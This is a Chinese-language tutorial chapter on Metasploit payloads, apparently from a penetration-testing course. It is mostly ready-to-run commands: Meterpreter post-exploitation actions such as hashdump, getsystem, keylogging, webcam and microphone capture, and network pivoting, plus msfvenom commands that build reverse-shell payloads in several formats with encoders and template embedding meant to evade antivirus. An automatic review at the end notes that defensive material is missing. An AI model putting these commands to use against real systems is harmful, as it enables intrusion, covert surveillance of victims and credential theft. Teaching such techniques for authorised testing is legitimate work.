# Payload深入

### 3.1 Meterpreter功能详解

Meterpreter 是 MSF 的核心后渗透载荷，运行在内存中，提供丰富的操作能力。

**文件操作**

```
meterpreter > upload /local/path/file.txt C:\\target\\path\\     # 上传文件
meterpreter > download C:\\target\\file.txt /local/path/         # 下载文件
meterpreter > cat C:\\Windows\\win.ini                           # 查看文件内容
meterpreter > edit C:\\target\\config.txt                        # 编辑文件
meterpreter > cd C:\\Users\\Public                                # 切换目录
meterpreter > ls                                                  # 列出文件
meterpreter > pwd                                                 # 当前路径
meterpreter > mkdir C:\\temp\\test                                # 创建目录
meterpreter > rm C:\\target\\file.txt                             # 删除文件
```

**系统命令**

```
meterpreter > sysinfo              # 系统信息（OS/架构/主机名）
meterpreter > getuid               # 当前用户权限
meterpreter > getpid               # 当前进程 ID
meterpreter > ps                   # 进程列表
meterpreter > migrate <PID>        # 迁移到其他进程（提升稳定性）
meterpreter > execute -f cmd.exe -i -H  # 执行程序并交互
meterpreter > shell                # 获取系统 Shell
meterpreter > hashdump            # 导出密码哈希（需 SYSTEM 权限）
meterpreter > getsystem           # 尝试提权到 SYSTEM
meterpreter > reboot / shutdown   # 重启/关机
```

**网络操作**

```
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.5   # 端口转发
meterpreter > portfwd list                              # 查看转发列表
meterpreter > route add 10.0.0.0/24 1                 # 添加路由（1为会话号）
meterpreter > route list                                # 查看路由
meterpreter > run arp_scanner -r 10.0.0.0/24          # ARP 扫描内网
meterpreter > run post/multi/manage/autoroute SUBNET=10.0.0.0/24  # 自动添加路由
```

**摄像头与麦克风**

```
meterpreter > record_mic -d 30              # 录音 30 秒
meterpreter > webcam_list                    # 列出摄像头
meterpreter > webcam_snap -i 1               # 拍照
meterpreter > webcam_stream -i 1             # 视频流
```

**屏幕截图与键盘记录**

```
meterpreter > screenshot -p /tmp/screen.png  # 屏幕截图
meterpreter > screenshare                     # 实时屏幕监控（Web界面）
meterpreter > keyscan_start                  # 开始键盘记录
meterpreter > keyscan_dump                   # 导出键盘记录
meterpreter > keyscan_stop                  # 停止键盘记录
```

### 3.2 Stager与Stageless

```
Staged Payload（分阶段）:
├── Stager: 小体积初始载荷，建立连接后下载完整载荷
├── Stage: 完整的 Meterpreter 载荷
├── 优点: 体积小，适合严格长度限制
├── 缺点: 两次网络通信，留有网络指纹
└── 示例: windows/meterpreter/reverse_tcp

Stageless Payload（无阶段）:
├── 完整载荷一次性嵌入，无需二次下载
├── 优点: 单次通信，减少网络指纹
├── 缺点: 体积较大
└── 示例: windows/meterpreter_reverse_tcp
```

### 3.3 Payload编码与规避

```bash
# Msfvenom 生成带编码的 Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \                      # 编码迭代次数
  -f exe \                    # 输出格式
  -o payload.exe

# 多轮编码
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -x /usr/share/windows-binaries/plink.exe \  # 模板文件
  -k \                        # 保持模板功能
  -f exe -o evaded.exe

# 常用编码器:
# x86/shikata_ga_nai    → 多态编码，最常用
# x86/countdown         → 倒计时编码
# x86/fnsteg_mov        # 
# cmd/powershell_base64 → PowerShell 编码
# php/base64            → PHP Base64 编码
```

### 3.4 自定义Payload生成

```bash
# 生成不同格式的 Payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f war -o shell.war
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf

# 查看 Payload 选项
msfvenom -p windows/meterpreter/reverse_tcp --list-options
```

---

---

## 📋 内容审核与补充建议

> 针对「Payload深入」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
